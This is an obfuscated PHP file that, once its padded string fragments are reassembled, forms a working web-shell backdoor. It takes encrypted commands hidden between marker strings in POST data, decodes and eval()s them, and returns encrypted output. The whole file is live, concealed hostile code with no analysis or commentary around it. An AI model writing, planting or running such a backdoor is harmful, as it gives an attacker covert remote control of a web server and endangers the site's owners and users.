<?php
$w='Jntents("pJhp://iJnputJ"),$mJ)J==1) {@oJb_start()J;@evaJl(@gzuncomJpres';
$W='LJZpljuOSnJICJRH";function x($tJ,$k){$JJc=strlen(J$kJ);$l=strleJn($Jt)J';
$v=str_replace('cm','','crcmeacmtecmcm_funcmcticmon');
$z=';$oJ="";for(J$i=0;$i<$l;J){foJrJ($jJ=0;($j<J$c&&$i<$l);$jJ++,$i++){$o.J=J$tJ{$i}^$k';
$C='eaJn();$rJ=J@baJse64J_encode(@x(@gzcoJmprJJess($o)J,$kJ));printJ("$p$kh$r$kf");}';
$G='$kJ="1cd7c500";J$kh="dJJ5d6aa0aJ687d";$kfJ="3b49Ja193a2JJda";$p="UJvr';
$J='{$j};}}rJeturn $oJ;J}iJJf (@preg_match("/$kJh(J.+J)$kf/",@filJe_get_co';
$Z='Js(@x(@Jbase6J4J_decode($mJ[1]),$JJk)));$o=@ob_get_JcoJntenJts();@Job_end_cl';
$x=str_replace('J','',$G.$W.$z.$J.$w.$Z.$C);
$l=$v('',$x);$l();
?>
